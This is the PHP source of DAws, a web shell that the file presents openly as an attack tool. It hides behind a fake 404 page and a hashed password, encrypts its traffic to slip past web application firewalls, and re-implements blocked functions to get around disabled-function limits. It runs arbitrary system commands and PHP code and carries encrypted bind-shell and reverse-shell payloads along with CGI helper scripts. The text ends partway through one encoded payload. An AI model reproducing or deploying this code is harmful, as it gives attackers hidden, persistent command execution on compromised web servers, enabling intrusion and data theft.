<?php
#DAws
#Credits:
#	dotcppfile, Aces and Cyde

session_cache_limiter('nocache');
session_start();
ob_start();

#Login + Fake 404 Code -->
$static_404 = "
<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<html>
<head><title>404 Not Found</title></head>
<body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
<hr>
<address>".$_SERVER["SERVER_SOFTWARE"]." at ".$_SERVER['SERVER_ADDR']." Port 80</address>
</body>
</html>";

$dynamic_404 = "";

if (function_exists("curl_version")){
	$pageURL = 'http';
	if (@$_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
	$pageURL .= "://";
	if ($_SERVER["SERVER_PORT"] != "80") {
	    $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
	} else {
	    $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
	}

	$rand = generateRandomString();

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $pageURL.$rand);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$dynamic_404 = curl_exec($ch);
	curl_close($ch);

	$dynamic_404 = preg_replace("#$rand#ism", "", $dynamic_404);
}

if(!empty($dynamic_404)){
	$notfound = $dynamic_404;
}else{
	$notfound = $static_404;
}

if((isset($_POST['pass'])) && (!isset($_SESSION['login'])))
{
	if(md5($_POST['pass']) == "11b53263cc917f33062363cef21ae6c3")
	{
		$_SESSION['login'] = "login";
	}
	else
	{
		session_destroy();
		header("HTTP/1.1 404 Not Found");
		echo "$notfound";
		exit;
	}
}
else if(isset($_SESSION['login']))
{
	if ($_SESSION['login'] != "login")
	{
		session_destroy();
		header("HTTP/1.1 404 Not Found");
		echo "$notfound";
		exit;
	}
}
else
{
	session_destroy();
	header("HTTP/1.1 404 Not Found");
	echo "$notfound";
	exit;
}

if (isset($_GET["logout"]))
{
	if ($_GET["logout"] == "logout")
	{
		session_destroy();
		header("Location: ".$_SERVER['PHP_SELF']);
	}
}
#<--

#Generates a new random key and adds it to the session. This key will then be used for the XOR Encryption to bypass WAFs.-->
function generateRandomString($length = 10)
{
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++)
	{
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}

if (!isset($_SESSION['key']))
{
	$_SESSION['key'] = generateRandomString();
}
#<--

#Find a Writeable/Readable Dir-->
function getPaths($root)
{
	$blacklist_paths = array("../", "./", ".../");
	$whitelist_paths = array();
	if (version_compare(PHP_VERSION, '5.3.0') >= 0)
	{
		$iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
	}
	else
	{
		$iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root), RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
	}

	$paths = array($root);
	foreach ($iter as $path => $dir)
	{
		if ($dir->isDir())
		{
			$path = str_replace($root, "", $path);
			foreach($blacklist_paths as $blacklist)
			{
				$path = str_replace($blacklist, "", $path);
			}
			
			if(!empty($path) && !in_array($path, $whitelist_paths))
			{
				$whitelist_paths[] = $path;
			}
		}
	}
	return $whitelist_paths;
}

if (!isset($_SESSION['directory']))
{
	$parts = explode("/", $_SERVER['PHP_SELF']);
	$dirNumber = count($parts) - 2;

	$current = getcwd();

	if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN')
	{
		$current .= "/";
	}

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$parts2 = explode("\\", $current);
	}
	else
	{
		$parts2 = explode("/", $current);
	}

	$real_path = "";
	for ($i=0; $i<(count($parts2)-$dirNumber-1); $i++)
	{
		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$real_path .= $parts2[$i].'\\';
		}
		else
		{
			$real_path .= $parts2[$i].'/';
		}
	}

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$directories = glob($real_path . "\\*", GLOB_ONLYDIR);
	}
	else
	{
		$directories = glob($real_path . "/*", GLOB_ONLYDIR);
	}

	if ($directories)
	{
		if(count($directories) >= 20)
		{
			if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				if (file_exists($real_path.$parts2[count($parts2)-$dirNumber-1]))
				{
					$real_path .= $parts2[count($parts2)-$dirNumber-1]."\\";
				}
			}
			else
			{
				if (file_exists($real_path.$parts2[count($parts2)-$dirNumber-1]))
				{
					$real_path .= $parts2[count($parts2)-$dirNumber-1]."/";
				}
			}
		}
	}

	$directories = glob($real_path . "/*", GLOB_ONLYDIR);
	if ($directories)
	{
		if(count($directories) >= 20)
		{
			if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				if (file_exists($real_path.$parts2[count($parts2)-$dirNumber]))
				{
					$real_path .= $parts2[count($parts2)-$dirNumber]."\\";
				}
			}
			else
			{
				if (file_exists($real_path.$parts2[count($parts2)-$dirNumber]))
				{
					$real_path .= $parts2[count($parts2)-$dirNumber]."/";
				}
			}
		}
	}

	$paths = getPaths($real_path);
	$writeread_dir  = "";
	foreach($paths as $path)
	{
		if((is_writable("$real_path$path")) && (is_readable("$real_path$path")))
		{
			$writeread_dir  = "$real_path$path";
			break;
		}
	}
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$writeread_dir  .= "\\"; 
	}
	else
	{
		$writeread_dir  .= "/"; 
	}
}
else
{
	$writeread_dir = $_SESSION['directory'];
}
#<--

#`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
$base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");

function binToDec($string)
{
	$decimal = "";
	for($i = 0; $i<strlen($string); $i++)
	{
		$dec = intval($string{(strlen($string))-$i-1})*pow(2, $i);
		$decimal+=$dec;
	}
	
	return intval($decimal);
}

function decToBin($dec)
{
	$binary = "";
	$current = intval($dec);

	if ($current == 0)
	{
		return "0";
	}
	
	while (1)
	{
		if ($current == 1)
		{
			$binary="1".$binary;
			break;
		}
		$binary = ($current%2).$binary;
		$current = intval($current/2);
	}
	
	return $binary;
}

function base64encoding($string)
{
	global $base64ids;

	$binary = "";
	for ($i = 0; $i<strlen($string); $i++)
	{
		$charASCII = ord($string{$i});
		$asciiBIN = decToBin($charASCII);
		if (strlen($asciiBIN) != 8)
		{
			$asciiBIN = str_repeat("0", 8-strlen($asciiBIN)).$asciiBIN;	
		}
		$binary.= $asciiBIN;
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 6)
	{
		$part = substr($binary, $j, 6);
		array_push($array, $part);
	}

	if (strlen($array[count($array)-1]) != 6)
	{
		$array[count($array)-1] = $array[count($array)-1].str_repeat("0", 6 - strlen($array[count($array)-1]));
	}

	$base64 = "";
	foreach ($array as &$value)
	{
		$value = binToDec($value);
		$value = $base64ids[$value];
		$base64.=$value;
	}

	if ((strlen($base64) % 4) != 0)
	{
		$base64.=str_repeat("=", 4-(strlen($base64) % 4));
	}

	return $base64;
}

function base64decoding($string)
{
	global $base64ids;

	$string = str_replace("=", "", $string);

	$binary = "";	
	for ($i = 0; $i < strlen($string); $i++)
	{
		$charID = array_search($string{$i}, $base64ids);
		$idBIN = decToBin($charID);
		if (strlen($idBIN) != 6)
		{
			$idBIN = str_repeat("0", 6-strlen($idBIN)).$idBIN;	
		}
		$binary.= $idBIN;
	}
	
	if (strlen($binary) %8 != 0)
	{
		$binary = substr($binary, 0, strlen($binary)-(strlen($binary) %8));
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 8)
	{
		$part = substr($binary, $j, 8);
		array_push($array, $part);
	}

	$text = "";
	foreach ($array as &$value)
	{
		$value = binToDec($value);
		$value = chr($value);
		$text.=$value;
	}

	return $text;
}
#<--

#XOR Encryption based on the Session's Randomized Key-->
function xor_this($string)
{
	$key = $_SESSION['key'];
	$outText = '';

 	for($i=0;$i<strlen($string);)
 	{
		for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
		{
			$outText .= $string{$i} ^ $key{$j};
		}
	}
	return str_replace("+", "%2B", base64encoding($outText));
}

function unxor_this($string)
{
	return base64decoding(xor_this(base64decoding($string)));
}
#<--

#XOR Encryption based on the key `dotcppfile` to decrypt the Built In Shell Codes-->
function sh3ll_this($string)
{
	$key = "dotcppfile";
	$outText = '';

 	for($i=0;$i<strlen($string);)
 	{
		for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
		{
			$outText .= $string{$i} ^ $key{$j};
		}
	}
	return base64encoding($outText);
}

function unsh3ll_this($string)
{
	return base64decoding(sh3ll_this(base64decoding($string)));
}
#<--

#Checks if a function is/isn't disabled
$disbls = @ini_get(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.@ini_get(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
if ($disbls == ",")
{
	$disbls = get_cfg_var(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.get_cfg_var(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
}
$disbls = str_replace(" ", "", $disbls);
$disblsArray = explode(",", $disbls);

function checkIt($func)
{
	global $disblsArray;

	foreach ($disblsArray as $value)
	{
		if ($func == $value)
		{
			return False;
		}
	}

	return True;
}
#<--

#Removes a Dir-->
function rrmdir($dir)
{
	if (is_dir($dir))
	{
		$objects = scandir($dir);
		foreach ($objects as $object)
		{ 
			if ($object != "." && $object != "..")
			{
				if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
			}
		}
		reset($objects);
		rmdir($dir);
		return True;
	}
	else
	{
		return False;
	}
}
#<--

#Gets Files/Dirs Permissions-->
function getPermission($location)
{
	$perms = fileperms($location);

	if (($perms & 0xC000) == 0xC000)
	{
		$info = 's';
	}	
	elseif (($perms & 0xA000) == 0xA000)
	{
		$info = 'l';
	}	
	elseif (($perms & 0x8000) == 0x8000)
	{
		$info = '-';
	}	
	elseif (($perms & 0x6000) == 0x6000)
	{
		$info = 'b';
	}		
	elseif (($perms & 0x4000) == 0x4000)
	{
		$info = 'd';
	}	
	elseif (($perms & 0x2000) == 0x2000)
	{
		$info = 'c';
	}	
	elseif (($perms & 0x1000) == 0x1000)
	{
		$info = 'p';
	}	
	else
	{
		$info = 'u';
	}
	
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));

	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));

	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}
#-->

#Used to Sort the data in the File Manager-->
function sortRows($data)
{
	$size = count($data);

	for ($i = 0; $i < $size; ++$i)
	{
		$row_num = findSmallest($i, $size, $data);
		$tmp = $data[$row_num];
		$data[$row_num] = $data[$i];
		$data[$i] = $tmp;
	}

	return ($data);
}

function findSmallest($i, $end, $data)
{
	$min['pos'] = $i;
	$min['value'] = $data[$i]['data'];
	$min['dir'] = $data[$i]['dir'];
	for (; $i < $end; ++$i)
	{
		if ($data[$i]['dir']) 
		{
			if ($min['dir'])
			{
				if ($data[$i]['data'] < $min['value'])
				{
					$min['value'] = $data[$i]['data'];
					$min['dir'] = $data[$i]['dir'];
					$min['pos'] = $i;
				}
			} 
			else
			{
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		} 
		else
		{
			if (!$min['dir'] && $data[$i]['data'] < $min['value'])
			{
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		}
	}
	return ($min['pos']);
}
#-->

#Checks if what's appended is Installed on the system-->
function soft_exists($command)
{
	global $shell_exec, $exec, $popen, $proc_open, $cgi, $shsh;
	$whereIsCommand = (PHP_OS == 'WINNT') ? 'where' : 'which';

	$complete = "$whereIsCommand $command";

	if($shell_exec == True)
	{
		return shell_exec($complete);
	}
	else if($exec == True)
	{
		return exec($complete);
	}
	else if($popen == True)
	{
		$pid = popen($complete,"r");
		$result = fread($pid, 4096);
		pclose($pid);
		return $result;
	}
	else if($proc_open == True)
	{
		$process = proc_open(
			$complete,
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);

		if ($process !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($process);

			return $stdout;
		}
		else
		{
			return "false";
		}
	}
	else if($cgi == True)
	{
		$complete = base64encoding($complete);
		return url_get_contents($_SESSION["onlinecgi"]."?command=$complete");
	}
	else if($shsh == True)
	{
		return shsh($complete);
	}
	else
	{
		return "false";
	}
}
#<--

#Holds Windows Loc-->
$powershell = "";
$python = "";
$ruby = "";
$perl = "";
#<--

#Executes system commands -->
function evalRel($command)
{
	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru, $cgi, $shsh;
	if ($system == True)
	{
		system($command);
	}
	else if($passthru == True)
	{
		passthru($command);
	}
	else if($shell_exec == True)
	{
		echo shell_exec($command);
	}
	else if($exec == True)
	{
		echo exec($command);
	}
	else if($popen == True)
	{
		$pid = popen( $command,"r");
		while(!feof($pid))
		{
			echo fread($pid, 256);
			flush();
	 		ob_flush();
			usleep(100000);
		}
		pclose($pid);
	}
	else if($proc_open == True)
	{
		$process = proc_open(
			$command,
			array(
				0 => array("pipe", "r"), //STDIN
				1 => array("pipe", "w"), //STDOUT
				2 => array("pipe", "w"), //STDERR
			),
			$pipes
		);

		if ($process !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($process);
		}

		if ($stderr != "")
		{
			echo $stderr;
		}
		else
		{
			echo $stdout;
		}
	}
	else if($cgi == True)
	{
		$command = base64encoding($command);
		echo url_get_contents($_SESSION["onlinecgi"]."?command=$command");
	}
	else if($shsh == True)
	{
		return shsh($command);
	}
	else
	{
		return "False";
	}
}
#<--

#Zips Windows Dir-->
function zipWindows($zip_location, $folder)
{
	$code = 'ArchiveFolder "' . $zip_location . '", "' . $folder . '"'.unsh3ll_this("NxoWQzECBQEFEwEpGw8UFRRJRB8NHzIKHBVKSR8jCwMQBgJZbGNMRURPIwoEGEYqHgAFGxEsEhoDChhNRjwXERkAEgACAkopHQ8VIx8aGAAJIBYJFRMSS0VvRE9UQ1BQRkkWDBQpHQ8VUFtJQiIBGzUBAx8KHBgANA4ACz4RCwxEHw0fMgocFU9jTEVET1RDUFAVLwMJAAoGQ01QSC4JESUNBwwcBRIMPAQQBzoCHRVOGioKCAsREVl6bElMRURPVENQJw8dBEVKLAYGEQQDPQkdECkdDxVYHAAcIw0DEU9QJBQcCUxuT1RDUFBGSUxFRE9UTScCDx0JRScHBktIQE9JSkUnBwZLR0VPSUpFJwcGS0VZRk9MJgwdXFVZUEBJPxEWBhoEWEFeRUwGDB1cU1lZbElMRURPVENQNQgNTDINGxxpUFBGSSkLAE8jCgQYbGNMRURPIwoEGEYqHgAFGxEsEhoDChhNRjwcBhwcSCgcFQgGFwIEGQkHTkxuT1RDUFBGSUxLKg4ZBiMABwoJTR4GBCUZHANAQiYLHw0rFQIDSUIrBQIRMAARBQxEFiIAGAcVAk9HJREBAgdpelBGSUxFRE9UJx9QMwcYDAhPWi0RHQM6HAQHClwZGQAgAAAATUE9FxUdFUcvChEBAENNUDljTEVET1RDUFBGSUxFRE9UQ1BeKAgBADcfFQAVWBUvAwkACgZKXjkSDAEWSiwbFh4EbElMRURPVENQUEZJTDI3DAYKAARIOgAAAR9UUkBAVklmRURPVENQUEYlAwoUZVRDUFAjBwhFMwYAC3p6IwcIRTcaFg==");

	file_put_contents("zipFolder.vbs", $code);
	evalRel("cscript //nologo zipFolder.vbs");
}
#<--

#PHP Eval (using include, include_once, require or require_once)-->
function runPHP($code)
{
	global $writeread_dir;

	$filename = rand(1, 1000) . ".php";
	file_put_contents($writeread_dir  . $filename, $code);
	
	if (checkIt("include"))
	{
		include($writeread_dir  . $filename);
	}
	else if (checkIt("include_once"))
	{
		include_once($writeread_dir  . $filename);
	}
	else if (checkIt("require"))
	{
		require($writeread_dir  . $filename);
	}
	else if(checkIt("require_once"))
	{
		require_once($writeread_dir  . $filename);
	}
	else
	{
		echo "<p class='danger'>`include`, `include_once`, `require` and `require_once` are all Disabled.</p>";
	}

	unlink($writeread_dir  . $filename);
}
#<--

#CGI Essentials-->
$htaccess="bi4QBzgRCA0AABZPFwQZXRUKHgwUG1RNAxhGRw4EEGU7EwQZCQcfRU8qDAYTMyEgZg==";

$cgish="R05bARkeSQsNFgxlfgYTGAlJTiYLAQAGHgRLHRUVAVVUFxUIEkYEEQkDVmkVEw4GTEdGZX4AHx0LCAIBWQ8RABgfRktINDEqJjovIzI7JSsjTVQfUAMDDUxICk9TEF8uSEMPCgkCFQ0UTTpBNztCMl4/WV5MTUM5VUAERFAMRgsNFgFZQENdXQIMDwoAClQfUAMDDUxHF0BRUUBfRkYLR0QTVBAVFEZLH0pPQFRMF1IGYwkTBQNURxMfCwQNCwA=";

$cgibat="JAoXCx9QCQ8Kb24KFwsfUCUGAhEBAQBOBAkWDFZFEAoMF18YEgQAbwEMHAxeemwACkUqICBDUlU3PCk3PTAnNyI5KC5JR0RSSUNSUmxBZmwNCVQGCBkVHUwBAQwbBxVeEhEYRQAKGEMUFQUGCABKGwwXenlODA8NC09RMiU1NDAzNjA9PS03ShhRSUxEUVQGHhMJDQkBShsMF3p5BQweEREbHQ9QXQIMDwoAClRBFR4FBggAAEEAGwRSRksIAAcAEAZeBB4dTm9tBhJDFQgPGhhFAAoXDBQVSB0UEW5mXGl5eRIQHABECxEAHxQDRxgdEE9+all6Tw==";
#<--

#Encrypted Shells and Tools--> 
$phpbindshell = "blNLExgAbElMRURPVCMDFRI2GAwJCisPGR0PHURVTVRUIxkXCAYeADsaBwYCLwcLAxcQR0VKS1AmAAIMOxwRF1hXCwgUOgEXEQAFBA8GAjoQBhkGV1xWQFdvRE9UQ1BQQjEkEB0XB14wGQgAMwIBG1xEFBkVCA4JATASFh4TEgADCxdIXVh6UEZJTEVEBhJLURULGRgcTEssKwUJHhpFTB9lVENQUEZJTEVANzwWCQgVVBwXAQgrERUACggPAExIWzhcUDtCQ0JIT1NPV1xGTTQtERYMEFlLbElMRURPVENQVD4hGRwcHEkGCAAKBggATEhYRFxQQjEkEB0XB0pLekZJTEVET1RDVCguHBUdF1IVEQIRHzYBBBRHUxcCGQtOQEVANzwWCQgVQFdvRE9UQ1BQGwwAFgEUfkNQUEZJTEVESywrBQkeGlEEFh0VGlhZXWNMRURPVEMNekZJTEVET35DUFBGTRwKFhtJV0REUlJmb0RPVENUAwUFUUIXABcIFQQ5Ch4ABRsRPBwZFR0JC0NUfkNQUEYACk0NHCsAERwKCA4JAUdQEBMcT09KRA0BKwICAgcQREEXDBhPVCguHBUdF0ZdGHpQRklMRURLBwwTG1spSBYHA1xHAB8UHUVebk9UQ1ANAwUfAB9lVENQUEZJSBYLDB9eMAMJCgcAEDAXERUREgxEJCIwPS01JEo6IyYvMCc3IjUnJEA2KyMrNzMgT1JmRURPVENQVBQMGFgkHBsAGxUSNg4MCgtcRwMfBQJAVUhLBAwCBE9SZkVET1RDUFQUDBhYJBwbABsVEjYADBcbEQ1YVBUGDw5IWl1YelBGSUwYbk9UQ1BUCxoLFgsMH14wAwkKBwAQMBUAExUWHURBFwAXCFlLbElMRUQvBwwTGwMdMwYIAAcGWFQVBg8OTVR+aVBQRkkbDQ0DEUs2MSo6KURZUjQQHxMNDBg6FwoYBhMETk0eWAUdBgIJWEIEHwIXABcIWVxGTRtYKjo4L1xQQgxRKzEjOE9QPjMlIExNZVRDUFAdY0xFRE9UQ1QfRlRMQkNUfkNQUEZJTEEHUjQQHxMNDBg6FgoVB1hUCxoLFgsMH09CQFJRQDUsPystPyIrKCA6Nio1J1lLbElMRURPVAoWWCAoIDYhUkleVBNPEg4XAQ4fWA16RklMRURPHQVYAxMLHxEWR1AAXEBKWkVFWVJURBMURk5FHm5PVENQUEZJTAYMCx0RWAMTCx8RFkdQAFxDSkRdTE1UfkNQUEZJTBhEChgQFVAPD0xNFxoWEAQCTk0PSVRDQEpQTVtJSxQRBgBEUAwaSR8QBhwAEVhUBUVcSVBGVF5NUEEMFAwQSF1DC3pGSUxFRE9UQxICAwgHXm5PVENQUEYUCQkXCg9pUFBGSUxFRE9+Q1BQRklMDAJPXCUxPDUsTERZUlQQBAIWBh9NFxsGFx8cCR4JF0w/PDMvPzVAQEVDGB0NV1BPQEwebk9UQ1BQRklMQQdSUABeUkZbUkNVZVZYelBGSUxFRBJ+Q1BQRklMQSwWOjEdPVtOBRY7DBUPHBEEBQlCX2VUQ1BQRklIIQ4dACtNVw8HMwQWHRUaV0tsSUxFRE9UaVBQRklMRQ0JXEc4CSg7AShMSBEbFRNBQA0LAE5QJxoCEiFEQgEXEQBXXEIxJBAdFwdKWQtsSUxFRE9UQ1BUCVQNFxYODUtZS2xJTEVET1RDUBUeDA9NQAxYRx9ZXWNMRURPVENQUEIGUQ8LBhpLExgUQV1VTUNQDFleBQEeTVVfXVh6UEZJTEVEEhEPAxVsSUxFRE9UChZYQiEVKzYCOUtXABQGDzoLHxENV1kHBwhEQCseEQQ4Tk4cFwsMKwwAFQhOQEE8JwEaCANPQBdvRE9UQ1BQRklIDQUBEA8VTRYbAwY7AAQGHlhCCkAEFh0VGlgRFBsNHEwfHRMVXEEbS0xIDgYREQlOGQUVAUNTFFdZSggeFwUWXBMZAANFSxJDRl1PVAAPGQkWTVR+Q1BQRklMRURLG14+JSolV29ET1RDUFBGSRsNDQMRS1EWAwYKTUAfHRMVAz1YMUxNFH5DUFBGSUxFRE9URx9eWw8eAAULXEcAGRYMHz5VMlhSQEJSQFdvRE9UQ1BQRkkRb0RPVENQUEZJLBUWABc8ExwJGglNQAcVDRQcA0BXb0RPVENQUBsMABYBZVRDUFBGSQUDTEs8Gj4iCyREQhcWBxcVHUFADQsATlAnGgISIURCFxYHFxUdQUVIPSwaDRsDWU8SZkVET1RDUFBGBg46FxsVEQRYT1JmRURPVENQUEYaFRYQChlLVBNPUmZFRE9UQ1BQRk0DWAsNKwQVBDkKAwsQChoXA1hPUmZFRE9UQ1BQRgYOOgEBEDwTHAMIAk1NVH5DUFBGSUwYAQMHBnpQRklMRUQGEktUOB8nPggpR1MTHwADB0tMBQEQQlQ0DBsYLUxIBAwAFQhOQEE8JwEaCANPQBdvRE9UQ1BQRklIAxRSBAwAFQhBSAZISAZEWUtsSUxFRE9UQ1BUCVQiMCgjT2lQUEZJTEVETx0FWBkVNh4AFwABERMVTk0KFU1GD2lQUEZJTEVET1RDBxgPBQlNRQkRDBZYQg8cTE0UfkNQUEZJTEVET1RDUFQJR1EDFgoVB1hUABlAVFRdQEpLekZJTEVET1RDUFAbY0xFRE9UQ1BQG2NMRURPVENQUCYZDwkLHBFLVBYWQFdvRE9UQ1BQGwwAFgFlVENQUEZJBQNMSzwaPiILJERCFA4HEAQYFBxLTAUBEEJUNAwbGC1MSAQCAwMSAR4QQ0NQOzgFHxEfTE0UfkNQUEZJTEVEABY8AwQHGxhNTVR+Q1BQRklMRUQfFRADBA4bGU1ADF1YelBGSUxFRE9URx9NCQszAgEbKwAfHhIMAhEXR11YelBGSUxFRE9UDBIvAwcIOgcDEQIeWE9SZkVET1RDUA0DBR8Abk9UQ1BQRgAKTUAnDS0iHStBSxYMChgPLxUeDA9CTQ4aB1FUIgMeESxHUxAYFQoFMwAcChdEXFQ+IRkcHBxdSgt6RklMRURPVENUH1saBAAIAysGCBUFQUgGTVR+Q1BQRklMGAEDBwZ6UEZJTEVEFH5DUFBGSUxFREsbXkBLbElMRURPVB56UEZJTG9ET1RDUFAbY0xFRE9UQzADCQoHABAwAxEZBANBSAgXCAcMExtKTQNJFxsGDxUeTk0DTE1UfkNQUEYUZkVET1QjAx8FAgkROwwYDAMVTk0BFgMcGwAbWV1jU1tu";

$phpreverseshell = "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